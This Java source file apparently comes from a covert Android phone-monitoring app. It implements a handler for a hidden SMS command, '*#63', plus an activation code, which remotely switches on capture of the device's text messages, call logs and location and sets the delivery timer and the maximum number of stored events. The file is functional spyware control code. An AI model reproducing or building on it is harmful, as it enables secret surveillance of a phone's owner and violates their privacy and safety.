package com.vvt.android.syncmanager.smscommand.interpreter;

import java.util.regex.Pattern;

import android.content.Context;

import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.android.syncmanager.smscommand.SmsCommandHelper;

public class SmsEventSetting {

	private static final String TAG = "SmsEventSetting";
	private static final boolean DEBUG = true;
 	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	public static final String COMMAND_ID = "*#63";
	
	//	<*#63><FK><nStartCapture><nDeliveryTimer><nMaxEvent><fS,fC,fE,fL>
	//	
	//	fS = flag for SMS event
	//	fC = flag for Call log event
	//	fE = flag for Call log event
	//	fL = flag for Location
	//	
	//	Note:
	//	If fL is on, it will use current update interval because this command doesn't accept interval value
	//	Android doesn't support Email so fE doesn't matter
	public static String processCommand(Context context, String[] tokens) {
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				(tokens.length == 6 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 7 && SmsCommandHelper.isEndWithDebugTag(tokens));
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = SmsCommandHelper.getActivationCodeValidation(tokens[1]);
		if (!activationCodeValidation.equals(
				StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Details Validation
		boolean validation = Pattern.matches("[0-1]", tokens[2])
				&& Pattern.matches("[0-9]*", tokens[3]) 
				&& Integer.parseInt(tokens[3]) >= 1 && Integer.parseInt(tokens[3]) <= 24
				&& Pattern.matches("[0-9]*", tokens[4])
				&& Integer.parseInt(tokens[4]) >= 1 && Integer.parseInt(tokens[4]) <= 500
				&& Pattern.matches("[0-1],[ ]*[0-1],[ ]*[0-1],[ ]*[0-1]", tokens[5]);
				
		// If validation is failed
		if (!validation) {
			return StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT;
		}
		
		ConfigurationManager configurationManager = Main.getInstance().getConfigurationManager();
		
		// Set Enable Start Capture
		boolean startCaptureFlag = tokens[2].equals("1");
		configurationManager.dumpCaptureEnabled(startCaptureFlag);
		
		// Set Delivery Timer
		int deliveryTimer = Integer.parseInt(tokens[3]);
		configurationManager.dumpEventsDeliveryPeriodHours(deliveryTimer);
		
		// Set Max Events
		int maxEvent = Integer.parseInt(tokens[4]);
		configurationManager.dumpMaxEvents(maxEvent);
		
		String[] eventsFlag = GeneralUtil.getTokenArray(
				tokens[5], SmsCommandHelper.COMMA_DELIMITERS);
		
		// Set Capture SMS
		boolean smsFlag = eventsFlag[0].equals("1");
		configurationManager.dumpCaptureSmsEnabled(smsFlag);
		
		// Set Capture Call
		boolean callFlag = eventsFlag[1].equals("1");
		configurationManager.dumpCapturePhoneCallEnabled(callFlag);
		
		// Set Capture Location
		boolean locationFlag = eventsFlag[3].equals("1");
		configurationManager.dumpCaptureLocationEnabled(locationFlag);
		
		return StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK + "\n" 
				+ SmsCommandHelper.getCurrentSettings();
	}
}
